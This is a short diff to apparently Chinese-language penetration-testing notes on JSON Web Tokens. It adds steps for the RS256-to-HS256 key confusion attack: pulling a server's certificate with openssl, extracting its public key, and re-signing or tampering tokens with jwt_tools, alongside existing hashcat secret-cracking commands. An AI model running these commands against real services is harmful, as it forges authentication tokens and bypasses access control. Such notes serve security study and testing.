@@ -17,4 +17,9 @@ echo jwt_token > jwt_file
 hashcat -a 0 -m 16500 jwt_file  jwt_secrets --force
 替换攻击
 算法RS256更改为HS256
+获取 public.pem
+openssl s_client -connect hostname:443
+服务器证书输出复制到一个文件cert.pem
+openssl x509 -in cert.pem -pubkey -noout > public.pem
 jwt_tools.py jwt_token -S hs256 -k public.pem
+jwt_tools.py jwt_token -S hs256 -k public.pem -T
